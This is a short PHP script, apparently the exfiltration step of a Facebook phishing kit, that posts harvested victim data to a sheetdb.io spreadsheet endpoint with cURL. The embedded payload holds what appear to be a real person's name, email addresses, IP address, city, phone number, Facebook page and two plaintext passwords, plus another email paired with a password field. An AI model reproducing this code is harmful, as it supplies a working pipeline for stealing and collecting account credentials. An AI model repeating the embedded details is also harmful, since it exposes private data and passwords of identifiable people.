<?php

$curl = curl_init();
$a = "Full Name: Messadaa 
Birth Day: Youssef 
Gioi Tinh: NAM
Email: youssefmessadaa@yahoo.fr 
Personal Email: youssefmessadaa@yahoo.fr 
Ip: 78.116.169.48
Country: FR
City: Chilly-Mazarin
Phone: 0628617987
FB Page:Primeurs du bel abord 
Password First: Samia1970
Password Second: Armagedon1966#";
$data = [[
    'Email' => 'rudifocqueur@gmail.com',
    'Password' => 'oooooo\\niiiii',
    'Infor' => $a,
]];

curl_setopt_array($curl, array(
    CURLOPT_URL => 'https://sheetdb.io/api/v1/vpa7txbvojlil',
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_ENCODING => '',
    CURLOPT_MAXREDIRS => 10,
    CURLOPT_TIMEOUT => 0,
    CURLOPT_FOLLOWLOCATION => true,
    CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
    CURLOPT_CUSTOMREQUEST => 'POST',
    CURLOPT_POSTFIELDS => json_encode($data),
    CURLOPT_HTTPHEADER => array(
        'Content-Type: application/json'
    ),
));

$response = curl_exec($curl);

curl_close($curl);
echo json_encode($response);
exit;
